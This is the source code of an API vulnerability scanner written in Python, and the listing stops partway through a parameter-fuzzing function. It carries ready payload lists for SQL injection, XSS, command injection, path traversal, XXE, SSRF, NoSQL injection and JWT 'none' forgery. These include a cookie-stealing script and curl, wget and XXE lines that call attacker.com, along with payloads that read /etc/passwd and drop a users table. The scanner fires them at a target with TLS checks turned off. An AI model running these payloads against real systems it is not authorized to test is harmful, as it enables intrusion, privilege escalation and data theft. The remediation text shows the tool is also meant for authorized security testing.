#!/usr/bin/env python3
"""
API Vulnerability Scanner v2.0 - Ghost Ops Security
Advanced API security testing with JSON pattern analysis and data manipulation
"""

import requests
import json
import time
import re
import argparse
import urllib.parse
import copy
from typing import Dict, List, Any, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from datetime import datetime
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

@dataclass
class Finding:
    """Data class for vulnerability findings"""
    endpoint: str
    method: str
    vulnerability_type: str
    severity: str
    description: str
    payload: str
    response_code: int
    evidence: str
    remediation: str
    timestamp: str
    manipulation_details: str = ""

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class APIVulnScanner:
    def __init__(self, base_url: str, headers: Dict = None, proxy: Dict = None, threads: int = 10, cookies: Dict = None):
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {}
        self.proxy = proxy
        self.threads = threads
        self.cookies = cookies or {}
        self.findings: List[Finding] = []
        self.endpoints: List[Dict] = []
        self.api_schemas: Dict = {}  # Store discovered API schemas
        self.json_patterns: List[Dict] = []  # Store JSON response patterns
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            self.session.cookies.update(self.cookies)
        
        # Load comprehensive payloads
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict:
        """Load comprehensive attack payloads"""
        return {
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' OR 'x'='x",
                "1; DROP TABLE users--",
                "' OR 1=1#",
                "' WAITFOR DELAY '0:0:5'--",
                "1' AND SLEEP(5)--",
                "' AND '1'='1",
                "' AND extractvalue(1,concat(0x7e,version()))--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<IMG SRC=\"javascript:alert('XSS');\">",
                "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
                "'-alert(1)-'",
                "\"><img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>"
            ],
            'command_injection': [
                "; ls -la",
                "| ls -la",
                "&& ls -la",
                "|| ls -la",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& whoami",
                "; ping -c 4 127.0.0.1",
                "`whoami`",
                "$(whoami)",
                "; sleep 5",
                "| sleep 5 #",
                "&& timeout 5",
                "; curl http://attacker.com",
                "| wget http://attacker.com"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                r"..\..\..\windows\win.ini",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "/etc/passwd",
                "../../../../../../etc/passwd%00",
                r"....\/....\/....\/etc/passwd",
                "....//....//....//windows/win.ini",
                "/var/www/../../etc/passwd"
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>'
            ],
            'ssrf': [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "http://127.1",
                "http://0.0.0.0",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://instance-data/latest/meta-data/",
                "http://127.0.0.1:22",
                "http://localhost:3306",
                "http://169.254.169.254/latest/user-data/"
            ],
            'idor': [
                "1", "2", "100", "999", "0", "-1", "admin", "test", "9999", "00001"
            ],
            'nosqli': [
                '{"$gt":""}',
                '{"$ne":null}',
                '{"$regex":".*"}',
                '{"username":{"$ne":null},"password":{"$ne":null}}',
                '{"$where":"sleep(5000)"}',
                '{"$or":[{},{"a":"a"}]}',
                '{"$gt": ""}',
                '{"$nin":[]}',
                '{"username":{"$regex":".*"}}'
            ],
            'jwt_attacks': [
                'none',
                'HS256',
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',  # None algorithm
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.test'  # Modified claims
            ],
            'mass_assignment': [
                '{"isAdmin":true}',
                '{"role":"admin"}',
                '{"permission":"admin"}',
                '{"admin":1}',
                '{"is_admin":true}',
                '{"user_role":"administrator"}',
                '{"privileges":["admin","superuser"]}',
                '{"account_type":"premium"}',
                '{"verified":true}',
                '{"active":true}',
                '{"approved":true}',
                '{"status":"active"}',
                '{"membership":"premium"}'
            ],
            'graphql_attacks': [
                '{ __schema { types { name } } }',
                '{ __type(name: "Query") { fields { name } } }',
                'query { user(id: "1") { password email ssn } }',
                'mutation { deleteUser(id: "1") { id } }',
                'query { users { password } }',
                '{ __schema { queryType { fields { name } } } }'
            ],
            'api_abuse': [
                '999999',
                '-1',
                '0',
                '{"price":0.01}',
                '{"discount":100}',
                '{"quantity":999999}',
                '{"amount":-100}',
                '{"balance":999999999}'
            ],
            'rate_limit_bypass': [
                '127.0.0.1',
                '0.0.0.0',
                '10.0.0.1',
                'localhost'
            ]
        }

    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════╗
║       API Vulnerability Scanner v2.0                      ║
║            Ghost Ops Security                              ║
║     Advanced API Testing with Pattern Analysis            ║
╚═══════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}[*] Target: {self.base_url}
[*] Threads: {self.threads}
[*] Cookies: {'Enabled' if self.cookies else 'None'}
[*] JSON Pattern Analysis: Enabled
[*] API Data Manipulation: Enabled
[*] Starting scan at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.END}
"""
        print(banner)

    def analyze_json_response(self, response: requests.Response, endpoint: str) -> Dict:
        """Analyze JSON response for patterns and structure"""
        try:
            json_data = response.json()
            analysis = {
                'endpoint': endpoint,
                'structure': self._get_json_structure(json_data),
                'sensitive_keys': self._find_sensitive_keys(json_data),
                'numeric_fields': self._find_numeric_fields(json_data),
                'boolean_fields': self._find_boolean_fields(json_data),
                'id_fields': self._find_id_fields(json_data),
                'url_fields': self._find_url_fields(json_data),
                'nested_objects': self._find_nested_objects(json_data),
                'array_fields': self._find_array_fields(json_data)
            }
            self.json_patterns.append(analysis)
            return analysis
        except:
            return {}

    def _get_json_structure(self, data, prefix='') -> Dict:
        """Recursively analyze JSON structure"""
        structure = {}
        if isinstance(data, dict):
            for key, value in data.items():
                full_key = f"{prefix}.{key}" if prefix else key
                structure[full_key] = type(value).__name__
                if isinstance(value, (dict, list)):
                    structure.update(self._get_json_structure(value, full_key))
        elif isinstance(data, list) and data:
            structure[f"{prefix}[0]"] = type(data[0]).__name__
            if isinstance(data[0], (dict, list)):
                structure.update(self._get_json_structure(data[0], f"{prefix}[0]"))
        return structure

    def _find_sensitive_keys(self, data, path='') -> List[str]:
        """Find potentially sensitive keys in JSON"""
        sensitive = []
        sensitive_patterns = [
            'password', 'passwd', 'pwd', 'secret', 'token', 'api_key', 'apikey',
            'private', 'ssn', 'social', 'credit', 'card', 'cvv', 'pin',
            'auth', 'session', 'jwt', 'bearer', 'key', 'salt', 'hash',
            'email', 'phone', 'address', 'dob', 'birth'
        ]
        
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if any(pattern in key.lower() for pattern in sensitive_patterns):
                    sensitive.append(current_path)
                if isinstance(value, (dict, list)):
                    sensitive.extend(self._find_sensitive_keys(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):  # Check first 5 items
                if isinstance(item, (dict, list)):
                    sensitive.extend(self._find_sensitive_keys(item, f"{path}[{i}]"))
        return sensitive

    def _find_numeric_fields(self, data, path='') -> List[Tuple[str, Any]]:
        """Find numeric fields for price manipulation testing"""
        numeric = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, (int, float)):
                    numeric.append((current_path, value))
                elif isinstance(value, (dict, list)):
                    numeric.extend(self._find_numeric_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    numeric.extend(self._find_numeric_fields(item, f"{path}[{i}]"))
        return numeric

    def _find_boolean_fields(self, data, path='') -> List[Tuple[str, bool]]:
        """Find boolean fields for privilege escalation testing"""
        boolean = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, bool):
                    boolean.append((current_path, value))
                elif isinstance(value, (dict, list)):
                    boolean.extend(self._find_boolean_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    boolean.extend(self._find_boolean_fields(item, f"{path}[{i}]"))
        return boolean

    def _find_id_fields(self, data, path='') -> List[Tuple[str, Any]]:
        """Find ID fields for IDOR testing"""
        ids = []
        id_patterns = ['id', 'user_id', 'account_id', 'order_id', 'product_id', 'uuid', 'guid', 'ref']
        
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if any(pattern in key.lower() for pattern in id_patterns):
                    ids.append((current_path, value))
                if isinstance(value, (dict, list)):
                    ids.extend(self._find_id_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    ids.extend(self._find_id_fields(item, f"{path}[{i}]"))
        return ids

    def _find_url_fields(self, data, path='') -> List[Tuple[str, str]]:
        """Find URL fields for SSRF testing"""
        urls = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, str) and ('url' in key.lower() or 'link' in key.lower() or value.startswith(('http://', 'https://'))):
                    urls.append((current_path, value))
                if isinstance(value, (dict, list)):
                    urls.extend(self._find_url_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    urls.extend(self._find_url_fields(item, f"{path}[{i}]"))
        return urls

    def _find_array_fields(self, data, path='') -> List[str]:
        """Find array fields for injection testing"""
        arrays = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, list):
                    arrays.append(current_path)
                elif isinstance(value, dict):
                    arrays.extend(self._find_array_fields(value, current_path))
        return arrays

    def _find_nested_objects(self, data, path='', depth=0) -> List[Dict]:
        """Find nested objects for deep testing"""
        nested = []
        if depth > 5:
            return nested
            
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, dict):
                    nested.append({'path': current_path, 'keys': list(value.keys()), 'depth': depth})
                    nested.extend(self._find_nested_objects(value, current_path, depth + 1))
                elif isinstance(value, list):
                    nested.extend(self._find_nested_objects(value, current_path, depth + 1))
        elif isinstance(data, list) and data:
            for i, item in enumerate(data[:3]):
                if isinstance(item, (dict, list)):
                    nested.extend(self._find_nested_objects(item, f"{path}[{i}]", depth + 1))
        return nested

    def manipulate_json_data(self, original_data: Dict, analysis: Dict) -> List[Dict]:
        """Generate manipulated versions of JSON data for testing"""
        manipulated_versions = []
        
        # Test 1: Flip all boolean fields
        if analysis.get('boolean_fields'):
            for field_path, original_value in analysis['boolean_fields']:
                test_data = copy.deepcopy(original_data)
                self._set_nested_value(test_data, field_path, not original_value)
                manipulated_versions.append({
                    'type': 'boolean_flip',
                    'field': field_path,
                    'original': original_value,
                    'modified': not original_value,
                    'data': test_data
                })
        
        # Test 2: Manipulate numeric fields (price, quantity, etc.)
        if analysis.get('numeric_fields'):
            for field_path, original_value in analysis['numeric_fields'][:10]:  # Limit to prevent too many tests
                for test_value in [0, -1, 0.01, 999999, -999999]:
                    test_data = copy.deepcopy(original_data)
                    self._set_nested_value(test_data, field_path, test_value)
                    manipulated_versions.append({
                        'type': 'numeric_manipulation',
                        'field': field_path,
                        'original': original_value,
                        'modified': test_value,
                        'data': test_data
                    })
        
        # Test 3: IDOR testing - modify ID fields
        if analysis.get('id_fields'):
            for field_path, original_value in analysis['id_fields'][:5]:
                for test_id in ['1', '2', '999', '0', 'admin', 'test']:
                    test_data = copy.deepcopy(original_data)
                    self._set_nested_value(test_data, field_path, test_id)
                    manipulated_versions.append({
                        'type': 'idor_test',
                        'field': field_path,
                        'original': original_value,
                        'modified': test_id,
                        'data': test_data
                    })
        
        # Test 4: SSRF via URL fields
        if analysis.get('url_fields'):
            for field_path, original_url in analysis['url_fields']:
                for ssrf_payload in self.payloads['ssrf'][:5]:
                    test_data = copy.deepcopy(original_data)
                    self._set_nested_value(test_data, field_path, ssrf_payload)
                    manipulated_versions.append({
                        'type': 'ssrf_test',
                        'field': field_path,
                        'original': original_url,
                        'modified': ssrf_payload,
                        'data': test_data
                    })
        
        # Test 5: Mass assignment - add privilege fields
        for payload in self.payloads['mass_assignment'][:5]:
            test_data = copy.deepcopy(original_data)
            try:
                additional_fields = json.loads(payload)
                test_data.update(additional_fields)
                manipulated_versions.append({
                    'type': 'mass_assignment',
                    'field': 'root',
                    'original': 'N/A',
                    'modified': payload,
                    'data': test_data
                })
            except:
                pass
        
        return manipulated_versions

    def _set_nested_value(self, data: Dict, path: str, value: Any):
        """Set value in nested dictionary using dot notation path"""
        keys = path.split('.')
        current = data
        
        for key in keys[:-1]:
            # Handle array notation
            if '[' in key:
                key_name = key.split('[')[0]
                index = int(key.split('[')[1].split(']')[0])
                if key_name not in current:
                    current[key_name] = []
                current = current[key_name][index]
            else:
                if key not in current:
                    current[key] = {}
                current = current[key]
        
        # Set the final value
        final_key = keys[-1]
        if '[' in final_key:
            key_name = final_key.split('[')[0]
            index = int(final_key.split('[')[1].split(']')[0])
            current[key_name][index] = value
        else:
            current[final_key] = value

    def discover_endpoints(self, wordlist: List[str] = None) -> List[Dict]:
        """Discover API endpoints through fuzzing"""
        print(f"\n{Colors.BOLD}[+] Phase 1: Attack Surface Mapping{Colors.END}")
        
        common_endpoints = wordlist or [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/admin',
            '/api/v1/login', '/api/login', '/api/auth/login',
            '/api/v1/register', '/api/register',
            '/api/v1/profile', '/api/profile', '/api/me',
            '/api/v1/upload', '/api/upload',
            '/api/v1/download', '/api/download',
            '/api/v1/search', '/api/search',
            '/api/v1/products', '/api/products',
            '/api/v1/orders', '/api/orders',
            '/api/v1/config', '/api/config',
            '/api/v1/settings', '/api/settings',
            '/api/v1/logs', '/api/logs',
            '/api/v1/backup', '/api/backup',
            '/api/v1/export', '/api/export',
            '/api/v1/import', '/api/import',
            '/api/v1/docs', '/api/docs', '/api/swagger', '/api/swagger.json',
            '/api/v1/health', '/api/health',
            '/api/v1/status', '/api/status',
            '/graphql', '/api/graphql',
            '/.git/config', '/.env', '/api/.env',
            '/api/v1/payments', '/api/payments',
            '/api/v1/cart', '/api/cart',
            '/api/v1/checkout', '/api/checkout'
        ]
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        discovered = []
        
        print(f"{Colors.YELLOW}[*] Fuzzing {len(common_endpoints)} endpoints with {len(methods)} methods...{Colors.END}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for endpoint in common_endpoints:
                for method in methods:
                    futures.append(executor.submit(self._test_endpoint, endpoint, method))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    discovered.append(result)
                    print(f"{Colors.GREEN}[✓] Found: {result['method']} {result['endpoint']} (HTTP {result['status']}){Colors.END}")
                    
                    # Analyze JSON responses immediately
                    if 'json_data' in result:
                        analysis = self.analyze_json_response_data(result['json_data'], result['endpoint'])
                        if analysis:
                            print(f"{Colors.CYAN}    → JSON Analysis: {len(analysis.get('sensitive_keys', []))} sensitive keys, "
                                  f"{len(analysis.get('numeric_fields', []))} numeric fields, "
                                  f"{len(analysis.get('boolean_fields', []))} boolean fields{Colors.END}")
        
        self.endpoints = discovered
        print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Discovered {len(discovered)} active endpoints{Colors.END}\n")
        return discovered

    def analyze_json_response_data(self, json_data: Any, endpoint: str) -> Dict:
        """Analyze JSON data without needing response object"""
        try:
            analysis = {
                'endpoint': endpoint,
                'structure': self._get_json_structure(json_data),
                'sensitive_keys': self._find_sensitive_keys(json_data),
                'numeric_fields': self._find_numeric_fields(json_data),
                'boolean_fields': self._find_boolean_fields(json_data),
                'id_fields': self._find_id_fields(json_data),
                'url_fields': self._find_url_fields(json_data),
                'nested_objects': self._find_nested_objects(json_data),
                'array_fields': self._find_array_fields(json_data)
            }
            self.json_patterns.append(analysis)
            return analysis
        except:
            return {}

    def _test_endpoint(self, endpoint: str, method: str) -> Dict:
        """Test if an endpoint exists and analyze response"""
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(
                method=method,
                url=url,
                timeout=10,
                verify=False,
                allow_redirects=False,
                proxies=self.proxy
            )
            
            if response.status_code != 404:
                result = {
                    'endpoint': endpoint,
                    'method': method,
                    'status': response.status_code,
                    'content_type': response.headers.get('Content-Type', ''),
                    'length': len(response.content)
                }
                
                # Try to parse JSON response
                try:
                    json_data = response.json()
                    result['json_data'] = json_data
                    result['has_json'] = True
                except:
                    result['has_json'] = False
                
                return result
        except Exception as e:
            pass
        return None

    def test_api_data_manipulation(self, endpoint_data: Dict):
        """Test API data manipulation vulnerabilities"""
        if not endpoint_data.get('has_json') or endpoint_data.get('method') not in ['POST', 'PUT', 'PATCH']:
            return
        
        print(f"\n{Colors.BOLD}[+] Phase: API Data Manipulation Testing - {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        original_data = endpoint_data.get('json_data', {})
        
        # Analyze the JSON structure
        analysis = self.analyze_json_response_data(original_data, endpoint_data['endpoint'])
        
        # Generate manipulated versions
        manipulated_versions = self.manipulate_json_data(original_data, analysis)
        
        print(f"{Colors.YELLOW}[*] Testing {len(manipulated_versions)} data manipulation scenarios...{Colors.END}")
        
        # Get baseline response
        try:
            baseline_response = self.session.request(
                endpoint_data['method'],
                url,
                json=original_data,
                timeout=10,
                verify=False,
                proxies=self.proxy
            )
            baseline_length = len(baseline_response.content)
            baseline_status = baseline_response.status_code
        except:
            return
        
        # Test each manipulation
        for manipulation in manipulated_versions[:50]:  # Limit tests
            try:
                response = self.session.request(
                    endpoint_data['method'],
                    url,
                    json=manipulation['data'],
                    timeout=10,
                    verify=False,
                    proxies=self.proxy
                )
                
                # Check for successful manipulation
                if response.status_code == 200 and abs(len(response.content) - baseline_length) > 10:
                    # Verify the manipulation was accepted
                    if manipulation['type'] == 'boolean_flip':
                        self._check_boolean_flip_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'numeric_manipulation':
                        self._check_numeric_manipulation_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'mass_assignment':
                        self._check_mass_assignment_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'idor_test':
                        self._check_idor_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'ssrf_test':
                        self._check_ssrf_success(endpoint_data, manipulation, response)
                        
            except Exception as e:
                pass

    def _check_boolean_flip_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if boolean flip was successful"""
        try:
            response_data = response.json()
            # Check if the flipped value is reflected
            if str(manipulation['modified']).lower() in str(response_data).lower():
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='Privilege Escalation via Boolean Manipulation',
                    severity='CRITICAL',
                    description=f'Boolean field "{manipulation["field"]}" can be manipulated from {manipulation["original"]} to {manipulation["modified"]}',
                    payload=json.dumps(manipulation['data'], indent=2)[:200],
                    response_code=response.status_code,
                    evidence=f'Field successfully changed: {manipulation["field"]}',
                    remediation='Implement proper authorization checks. Validate user permissions before accepting boolean field changes.',
                    manipulation_details=f'Field: {manipulation["field"]}, Original: {manipulation["original"]}, Modified: {manipulation["modified"]}'
                )
                print(f"{Colors.RED}[!] Boolean manipulation successful: {manipulation['field']}{Colors.END}")
        except:
            pass

    def _check_numeric_manipulation_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if numeric manipulation was successful"""
        try:
            response_data = response.json()
            # Look for price/amount manipulation acceptance
            if manipulation['modified'] in [0, 0.01, -1] and response.status_code == 200:
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='Price/Quantity Manipulation',
                    severity='CRITICAL',
                    description=f'Numeric field "{manipulation["field"]}" can be manipulated to {manipulation["modified"]}',
                    payload=json.dumps(manipulation['data'], indent=2)[:200],
                    response_code=response.status_code,
                    evidence=f'Numeric field accepted suspicious value: {manipulation["modified"]}',
                    remediation='Implement server-side validation for all numeric fields. Validate price and quantity ranges.',
                    manipulation_details=f'Field: {manipulation["field"]}, Original: {manipulation["original"]}, Modified: {manipulation["modified"]}'
                )
                print(f"{Colors.RED}[!] Numeric manipulation successful: {manipulation['field']} = {manipulation['modified']}{Colors.END}")
        except:
            pass

    def _check_mass_assignment_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if mass assignment was successful"""
        try:
            response_data = response.json()
            # Check if privilege fields were accepted
            privilege_indicators = ['admin', 'role', 'permission', 'privileges', 'is_admin', 'superuser']
            response_str = str(response_data).lower()
            
            if any(indicator in response_str for indicator in privilege_indicators):
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='Mass Assignment / Privilege Escalation',
                    severity='CRITICAL',
                    description=f'API accepts unauthorized privilege fields: {manipulation["modified"]}',
                    payload=json.dumps(manipulation['data'], indent=2)[:200],
                    response_code=response.status_code,
                    evidence=f'Privilege fields reflected in response',
                    remediation='Implement whitelist of allowed fields. Use separate DTOs for user input and internal models.',
                    manipulation_details=f'Added fields: {manipulation["modified"]}'
                )
                print(f"{Colors.RED}[!] Mass assignment successful - privilege escalation possible{Colors.END}")
        except:
            pass

    def _check_idor_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if IDOR manipulation was successful"""
        if response.status_code == 200:
            try:
                response_data = response.json()
                # If we got data back with different ID, it's IDOR
                if manipulation['modified'] != manipulation['original']:
                    self._add_finding(
                        endpoint=endpoint_data['endpoint'],
                        method=endpoint_data['method'],
                        vuln_type='Insecure Direct Object Reference (IDOR)',
                        severity='HIGH',
                        description=f'ID field "{manipulation["field"]}" allows unauthorized access',
                        payload=json.dumps(manipulation['data'], indent=2)[:200],
                        response_code=response.status_code,
                        evidence=f'Accessed different object by changing ID from {manipulation["original"]} to {manipulation["modified"]}',
                        remediation='Implement proper authorization checks for object access. Verify user owns the object.',
                        manipulation_details=f'Field: {manipulation["field"]}, Original ID: {manipulation["original"]}, Accessed ID: {manipulation["modified"]}'
                    )
                    print(f"{Colors.RED}[!] IDOR vulnerability: {manipulation['field']}{Colors.END}")
            except:
                pass

    def _check_ssrf_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if SSRF was successful"""
        # Check for indicators of internal access
        ssrf_indicators = ['meta-data', 'ami-id', 'instance-id', 'computeMetadata', 'privateIp', 'security-credentials']
        
        if any(indicator in response.text for indicator in ssrf_indicators):
            self._add_finding(
                endpoint=endpoint_data['endpoint'],
                method=endpoint_data['method'],
                vuln_type='Server-Side Request Forgery (SSRF)',
                severity='CRITICAL',
                description=f'SSRF via URL field "{manipulation["field"]}"',
                payload=manipulation['modified'],
                response_code=response.status_code,
                evidence=f'Internal/cloud metadata accessible',
                remediation='Implement URL whitelist. Validate and sanitize all URL inputs. Use separate networks for internal services.',
                manipulation_details=f'Field: {manipulation["field"]}, SSRF URL: {manipulation["modified"]}'
            )
            print(f"{Colors.RED}[!] SSRF vulnerability: {manipulation['field']}{Colors.END}")

    def test_graphql_introspection(self):
        """Test for GraphQL introspection and unauthorized queries"""
        print(f"\n{Colors.YELLOW}[*] Testing GraphQL endpoints...{Colors.END}")
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/query']
        
        for endpoint in graphql_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            for payload in self.payloads['graphql_attacks']:
                try:
                    # Try as GET query
                    response_get = self.session.get(
                        url,
                        params={'query': payload},
                        timeout=10,
                        verify=False,
                        proxies=self.proxy
                    )
                    
                    # Try as POST
                    response_post = self.session.post(
                        url,
                        json={'query': payload},
                        timeout=10,
                        verify=False,
                        proxies=self.proxy
                    )
                    
                    for response in [response_get, response_post]:
                        if response.status_code == 200:
                            response_text = response.text.lower()
                            
                            # Check for successful introspection
                            if '__schema' in payload and ('types' in response_text or 'fields' in response_text):
                                self._add_finding(
                                    endpoint=endpoint,
                                    method='POST',
                                    vuln_type='GraphQL Introspection Enabled',
                                    severity='MEDIUM',
                                    description='GraphQL introspection is enabled, revealing API schema',
                                    payload=payload,
                                    response_code=response.status_code,
                                    evidence='Schema information disclosed',
                                    remediation='Disable introspection in production environments.',
                                    manipulation_details='GraphQL schema exposed'
                                )
                                print(f"{Colors.YELLOW}[!] GraphQL introspection enabled{Colors.END}")
                            
                            # Check for sensitive data exposure
                            elif any(field in response_text for field in ['password', 'ssn', 'secret', 'token']):
                                self._add_finding(
                                    endpoint=endpoint,
                                    method='POST',
                                    vuln_type='GraphQL Sensitive Data Exposure',
                                    severity='HIGH',
                                    description='GraphQL query returns sensitive fields',
                                    payload=payload,
                                    response_code=response.status_code,
                                    evidence='Sensitive data fields accessible',
                                    remediation='Implement field-level authorization. Restrict sensitive field access.',
                                    manipulation_details='Sensitive fields exposed via GraphQL'
                                )
                                print(f"{Colors.RED}[!] GraphQL sensitive data exposure{Colors.END}")
                
                except Exception:
                    pass

    def test_authentication_bypass(self):
        """Test for authentication bypass techniques"""
        print(f"\n{Colors.YELLOW}[*] Testing authentication bypass techniques...{Colors.END}")
        
        # Test JWT manipulation
        if 'Authorization' in self.headers or 'authorization' in self.headers:
            auth_header = self.headers.get('Authorization') or self.headers.get('authorization', '')
            
            if 'Bearer' in auth_header:
                print(f"{Colors.CYAN}[*] Testing JWT token manipulation...{Colors.END}")
                
                # Test with 'none' algorithm
                none_token = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'
                
                test_headers = self.headers.copy()
                test_headers['Authorization'] = f'Bearer {none_token}'
                
                for endpoint_data in self.endpoints[:5]:
                    try:
                        url = f"{self.base_url}{endpoint_data['endpoint']}"
                        response = self.session.request(
                            endpoint_data['method'],
                            url,
                            headers=test_headers,
                            timeout=10,
                            verify=False,
                            proxies=self.proxy
                        )
                        
                        if response.status_code in [200, 201, 204]:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='JWT Algorithm Confusion',
                                severity='CRITICAL',
                                description='API accepts JWT with "none" algorithm, allowing authentication bypass',
                                payload=none_token,
                                response_code=response.status_code,
                                evidence='Token with "none" algorithm accepted',
                                remediation='Enforce specific JWT algorithms. Reject "none" algorithm tokens.',
                                manipulation_details='JWT algorithm set to "none"'
                            )
                            print(f"{Colors.RED}[!] JWT algorithm confusion vulnerability{Colors.END}")
                            break
                    except:
                        pass

    def test_rate_limiting(self):
        """Test for rate limiting bypass"""
        print(f"\n{Colors.YELLOW}[*] Testing rate limiting...{Colors.END}")
        
        if not self.endpoints:
            return
        
        test_endpoint = self.endpoints[0]
        url = f"{self.base_url}{test_endpoint['endpoint']}"
        
        # Test basic rate limiting
        success_count = 0
        for i in range(50):
            try:
                response = self.session.request(
                    test_endpoint['method'],
                    url,
                    timeout=5,
                    verify=False,
                    proxies=self.proxy
                )
                if response.status_code != 429:
                    success_count += 1
            except:
                pass
        
        if success_count > 45:
            self._add_finding(
                endpoint=test_endpoint['endpoint'],
                method=test_endpoint['method'],
                vuln_type='Missing Rate Limiting',
                severity='MEDIUM',
                description='API endpoint lacks rate limiting protection',
                payload='N/A',
                response_code=200,
                evidence=f'{success_count}/50 requests succeeded without rate limiting',
                remediation='Implement rate limiting per IP, user, or API key.',
                manipulation_details=f'{success_count} requests succeeded'
            )
            print(f"{Colors.YELLOW}[!] No rate limiting detected{Colors.END}")

    def fuzz_parameters(self, endpoint_data: Dict):
        """Fuzz endpoint parameters"""
        print(f"\n{Colors.BOLD}[+] Phase 2: Parameter Fuzzing - {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
        
        common_params = [
            'id', 'user', 'username', 'email', 'password', 'token',
            'file', 'filename', 'path', 'url', 'redirect', 'callback',
            'search', 'query', 'q', 'page', 'limit', 'offset',
